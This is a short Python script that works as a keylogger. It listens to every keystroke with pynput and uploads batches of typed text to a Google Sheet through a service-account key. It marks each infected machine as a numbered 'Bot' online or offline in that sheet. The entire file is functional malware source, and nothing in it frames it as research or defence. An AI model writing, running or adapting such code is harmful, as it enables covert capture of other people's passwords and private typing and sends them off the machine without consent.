import pynput
import gspread
from oauth2client.service_account import ServiceAccountCredentials

from pynput.keyboard import Key, Listener

scope = ['https://spreadsheets.google.com/feeds', 'https://www.googleapis.com/auth/drive']
creds = ServiceAccountCredentials.from_json_keyfile_name('sheets.json', scope)
client = gspread.authorize(creds)

sheet = client.open('HPA').sheet1

current_cell = 2

for celli in range(1, 17):
    if sheet.cell(1, celli).value == '':
        current_row = celli - 1
        break

    if celli == 16:
        quit()

sheet.update_cell(1, current_row, f'Bot {current_row} Online')

keys = []


def on_press(key):
    global keys

    keys.append(key)
    if len(keys) > 10:
        write_out()
        keys = []


def filter_spaces(character):
    if character == Key.space:
        return ' '

    elif character == Key.enter:
        return '/ENTER/'

    elif character == Key.shift:
        return '/SHIFT/'

    elif character == Key.backspace:
        return '\b'

    elif character in (Key.tab, Key.alt_r, Key.alt_l, Key.ctrl_l, Key.ctrl_r, Key.num_lock, Key.caps_lock):
        return ''

    else:
        return character


def write_out():
    global keys, current_cell, current_row

    keys = list(map(filter_spaces, keys))
    keys = list(map(str, keys))

    output = ''.join(keys).replace('\'', '')

    sheet.update_cell(current_cell, current_row, output)
    current_cell += 1
    

def on_release(key):
    pass


with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()

sheet.update_cell(1, current_row, f'Bot {current_row} Offline')
